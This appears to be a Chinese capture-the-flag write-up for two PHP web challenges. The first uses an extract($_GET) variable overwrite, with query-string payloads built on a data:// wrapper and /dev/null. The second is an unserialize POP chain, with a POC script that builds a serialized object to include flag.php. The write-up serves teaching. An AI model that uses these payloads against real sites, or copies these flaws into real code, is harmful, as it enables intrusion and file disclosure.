```php
<?php  
highlight_file(__FILE__);// 1. 显示当前文件的源代码（方便调试/查看）
$file_to_read = '/flag';// 2. 定义变量$file_to_read，初始值为'/flag'（目标flag文件路径） 
extract($_GET);// 3. 关键：将GET参数解析为变量并覆盖现有变量
if(isset($first)) // 4. 判断是否传入了$first参数
{    $second=file_get_contents($file_to_read);// 5. 读取$file_to_read对应的文件内容，赋值给$second
    if($first==$second)  
    {// 6. 判断$first是否等于$second
        echo file_get_contents('/flag');// 7. 若相等，输出flag内容
    }  
    else  
    {  
        die('nonono');// 8. 若不等，输出错误信息并终止
    }  
}
```
## 思路一
正常情况下，`$second`会读取`/flag`的内容，但我们不知道 flag 的值，无法让`$first`等于它。但通过`extract($_GET)`的变量覆盖，可以修改`$file_to_read`的值，让`$second`读取**我们可控的内容**（比如自己定义的字符串），再让`$first`等于这个内容，即可满足`$first==$second`的条件，最终输出 flag。伪协议可以将字符串 “伪装” 成文件内容`data://text/plain,abc` 会被`file_get_contents()`解析为 “文件内容是`abc`”所以payload是`?file_to_read=data://text/plain,abc&first=abc`
## 思路二
不用伪协议，可以利用服务器自带文件`/dev/null`（Linux 系统的 “空设备文件”，读取内容恒为空字符串）payload是`?file_to_read=/dev/null&first=`
## POP
```php
<?php
highlight_file(__FILE__);
//flag is in flag.php
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;//1.得到flag的位置，得触发append
    }
    public function __invoke(){
        $this->append($this->var);//2.触发append,得触发__invoke
    }
}
class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;//4.触发__get,得触发__tostring
    }
    public function __wakeup(){
        echo $this->source;//5,触发__tostring,得先触发__wakeup
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
    public function __get($key){
        $function = $this->p;
        return $function();//3.触发__invoke,得触发__get
    }
}
if(isset($_GET['pop'])){
    unserialize($_GET['pop']);//6.触发__wakeup
}
?>
```
POC
```php
<?php
class Modifier {
    public $var="flag.php";
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}
$a=new Modifier();
$b=new Test();
$b->p=$a;
$c=new Show();
$c->str=$b;
$c->source=$c;
echo urlencode(serialize($c));
```
